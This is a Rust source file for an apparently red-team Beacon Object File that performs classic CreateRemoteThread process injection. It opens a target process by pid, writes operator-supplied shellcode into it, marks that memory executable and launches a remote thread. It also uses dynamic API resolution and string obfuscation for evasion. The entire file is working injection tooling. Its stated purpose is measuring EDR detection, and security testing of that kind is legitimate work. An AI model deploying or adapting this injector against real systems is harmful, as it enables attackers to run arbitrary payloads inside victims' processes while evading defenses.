// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! Classic CreateRemoteThread injection. Kept as a DFR-only baseline so
//! operators can A/B test syscall-based injectors against EDR visibility.
//! Marked as DETECTABLE in the MITRE banner.
//!
//! Args: <pid> <shellcode-hex>

#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use alloc::string::String;
use alloc::vec::Vec;
use common::{mitre::Technique, dfr_fn, obf};

const TECHNIQUES: &[Technique] = &[
    Technique { id: "T1055.002", name: "Process Injection: Portable Executable Injection", tactic: "Defense Evasion" },
];

const PROCESS_ALL: u32 = 0x0010 | 0x0008 | 0x0020 | 0x0400 | 0x1000;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const PAGE_EXECUTE_READ: u32 = 0x20;

dfr_fn!(
    open_process(access: u32, inherit: i32, pid: u32) -> usize,
    module = "kernel32.dll", api = "OpenProcess"
);
dfr_fn!(
    virtual_alloc_ex(proc: usize, addr: usize, size: usize, ty: u32, prot: u32) -> usize,
    module = "kernel32.dll", api = "VirtualAllocEx"
);
dfr_fn!(
    write_process_memory(proc: usize, addr: usize, buf: *const u8, sz: usize, written: *mut usize) -> i32,
    module = "kernel32.dll", api = "WriteProcessMemory"
);
dfr_fn!(
    virtual_protect_ex(proc: usize, addr: usize, sz: usize, new_prot: u32, old_prot: *mut u32) -> i32,
    module = "kernel32.dll", api = "VirtualProtectEx"
);
dfr_fn!(
    create_remote_thread(proc: usize, attr: *mut u8, stack: usize, start: usize, param: usize, flags: u32, tid: *mut u32) -> usize,
    module = "kernel32.dll", api = "CreateRemoteThread"
);
dfr_fn!(
    close_handle(h: usize) -> i32,
    module = "kernel32.dll", api = "CloseHandle"
);

fn parse_u32(s: &str) -> Option<u32> {
    let mut v: u32 = 0; let mut any = false;
    for b in s.bytes() {
        if !b.is_ascii_digit() { return None; }
        v = v.checked_mul(10)?.checked_add((b - b'0') as u32)?;
        any = true;
    }
    if any { Some(v) } else { None }
}

fn parse_hex(s: &str) -> Option<Vec<u8>> {
    let mut out = Vec::with_capacity(s.len() / 2);
    let mut hi: Option<u8> = None;
    for c in s.bytes() {
        let v = match c {
            b'0'..=b'9' => c - b'0',
            b'a'..=b'f' => c - b'a' + 10,
            b'A'..=b'F' => c - b'A' + 10,
            b' '|b'\t'|b'\r'|b'\n'|b',' => continue,
            _ => return None,
        };
        match hi {
            None => hi = Some(v),
            Some(h) => { out.push((h << 4) | v); hi = None; }
        }
    }
    if hi.is_some() { return None; }
    if out.is_empty() { return None; }
    Some(out)
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);    let mut parser = rustbof::data::DataParser::new(args, len);
    match run(&mut parser) {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run(parser: &mut rustbof::data::DataParser) -> Result<(), &'static str> {
    let pid_s = String::from(parser.get_str());
    let hex_s = String::from(parser.get_str());
    let pid_s = pid_s.as_str();
    let hex_s = hex_s.as_str();
    if pid_s.is_empty() || hex_s.is_empty() {
        return Err("usage: inject-crt <pid> <shellcode-hex>");
    }
    let pid: u32 = parse_u32(pid_s).ok_or("invalid pid")?;
    let mut sc = parse_hex(hex_s).ok_or("invalid hex")?;

    let h = unsafe { open_process(PROCESS_ALL, 0, pid) }.map_err(|_| "OpenProcess resolve")?;
    if h == 0 { common::evasion::secure_zero(&mut sc); return Err("OpenProcess failed"); }

    let base = unsafe { virtual_alloc_ex(h, 0, sc.len(), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) }
        .map_err(|_| "VirtualAllocEx resolve")?;
    if base == 0 {
        let _ = unsafe { close_handle(h) };
        common::evasion::secure_zero(&mut sc);
        return Err("VirtualAllocEx failed");
    }

    let mut written: usize = 0;
    let rc = unsafe { write_process_memory(h, base, sc.as_ptr(), sc.len(), &mut written) }
        .map_err(|_| "WriteProcessMemory resolve")?;
    common::evasion::secure_zero(&mut sc);
    if rc == 0 {
        let _ = unsafe { close_handle(h) };
        return Err("WriteProcessMemory failed");
    }

    let mut old: u32 = 0;
    let rc2 = unsafe { virtual_protect_ex(h, base, written, PAGE_EXECUTE_READ, &mut old) }
        .map_err(|_| "VirtualProtectEx resolve")?;
    if rc2 == 0 {
        let _ = unsafe { close_handle(h) };
        return Err("VirtualProtectEx(RX) failed");
    }

    let mut tid: u32 = 0;
    let h_thr = unsafe { create_remote_thread(h, core::ptr::null_mut(), 0, base, 0, 0, &mut tid) }
        .map_err(|_| "CreateRemoteThread resolve")?;
    if h_thr == 0 {
        let _ = unsafe { close_handle(h) };
        return Err("CreateRemoteThread failed");
    }

    let _ = unsafe { close_handle(h_thr) };
    let _ = unsafe { close_handle(h) };

    obf! { let ok = "remote thread created"; }
    println!("[+] {} (pid={}, tid={})", ok, pid, tid);
    Ok(())
}
